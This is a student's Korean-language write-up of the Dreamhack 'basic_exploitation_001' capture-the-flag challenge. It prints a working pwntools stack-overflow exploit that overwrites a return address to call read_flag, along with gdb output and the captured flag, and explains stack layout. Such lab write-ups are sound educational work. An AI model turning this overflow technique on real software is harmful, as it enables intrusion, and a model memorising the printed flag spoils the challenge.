# basic_exploitation_001 파일의 분석 보고서
## 로직
main 함수에서 128byte짜리 buf를 선언하고 initialize 함수 호출,
버퍼의 크기를 0으로 설정함으로써 버퍼를 없애고 signal 함수를 통해 알람이 울리면 alarm_handler 함수가 호출되도록 한다.
30초 알람을 설정하고, 30초가 지나면 alarm_handler 함수에서 "TIME OUT"이라는 문자를 출력한 뒤 프로그램은 종료된다.

## Flag 획득 방법
read_flag 함수 안에 shell 명령어로 root에 저장되어 있는 flag 파일을 출력하는 방식으로 보인다.
그러므로 read_flag 함수를 실행시켜야 하는데 read_flag 함수를 호출하는 문은 없으니 강제로 실행시켜야 할 거 같다.

## 문제 풀이 계획
main 함수에서 선언된 지역변수 buf는 128byte이다. 
gets 입력을 통해 128byte + SFP(4byte)를 넘겨 입력한다면, RET 값을 변경할 수 있다.
반환될 주소 값으로 read_flag 함수의 메모리 주소를 넘겨준다면, flag를 출력할 것으로 예상된다.

## 문제 풀이
i fu 명령어를 사용해 함수 목록을 불러온다.
```
All defined functions:

Non-debugging symbols:
0x08048398  _init
0x080483d0  gets@plt
0x080483e0  signal@plt
0x080483f0  alarm@plt
0x08048400  puts@plt
0x08048410  system@plt
0x08048420  exit@plt
0x08048430  __libc_start_main@plt
0x08048440  setvbuf@plt
0x08048460  _start
0x08048490  __x86.get_pc_thunk.bx
0x080484a0  deregister_tm_clones
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048530  frame_dummy
0x0804855b  alarm_handler
0x08048572  initialize
0x080485b9  read_flag // Flag 출력 함수
0x080485cc  main
0x080485f0  __libc_csu_init
0x08048650  __libc_csu_fini
0x08048654  _fini
```
우리는 RET 값을 조작해 read_flag 함수를 호출해야 되니, read_flag 함수의 메모리 주소 '0x080485b9'를 복사해준다.

수업 시간에 배운 Pwntools를 이용해 서버에 요청을 보내는 Python 파일을 작성해보겠다.
```
from pwn import *

p = remote("host3.dreamhack.games", 10751)

text = "\x90"*132
text += p32(0x080485b9)

p.sendline(text)
p.interactive()
```
pwntools를 import 하고, NOP로 버퍼와 SFP를 채우는 문자를 작성하고, 
그 뒤 리틀엔디안 패킹 방식으로 read_flag 함수의 메모리 주소를 전달하기 위해 p32 함수를 이용하여 메모리 주소를 적어준다.
sendline 함수로 작성한 텍스트를 전송하고, Interactive 모드로 전환한다.

그 후 실행하면...
```
root@479ffb30c31c:~/cyber_guardians-pwnable/220924_Homework/2. Dreamhack# python DH_pwn.py
[+] Opening connection to host3.dreamhack.games on port 10751: Done
[*] Switching to interactive mode
DH{01ec06f5e1466e44f86a79444a7cd116}[*] Got EOF while reading in interactive
```
Flag가 출력되는 것을 볼 수 있다.

## 알게 된 내용
### 스택의 기본 구조
스택은 Buffer + SFP(4byte) + RET(4byte)로 구성된다.

#### Buffer
버퍼는 데이터가 저장되는 공간이다.

#### SFP
SFP는 스택 베이스 값을 뜻한다.
스택 주소값을 계산, 현재 스택값을 기준으로 할 때 필요한 프레임 포인터의 값을 저장한다.

#### RET
RET은 Return의 약자로 다음에 실행해야 할 명령이 존재하는 메모리 주소를 가지고 있다.
그러므로 RET에 있는 메모리 주소를 변경하게 된다면, 원하는 명령을 실행할 수 있다.

## 여담
파이썬 파일의 이름을 pwn.py로 했다가
```
NameError: name 'remote' is not defined
```
remote가 정의되지 않았다는 오류를 엄청나게 보았는데, 난 멍청하게 '왜 패키지를 못 불러오지..?' 라는 생각만 했다. ㅋㅋㅋ
패키지 업데이트도 해보고 파이썬 버전도 바꿔봤는데 계속 오류가 났다.

그렇게 Stackoverflow를 뒤지다가 나 같은 사람이 작성한 글을 보게 되었다. ㅋㅋ.....

"아.. 내 파이썬 파일 이름이 pwn 이구나.."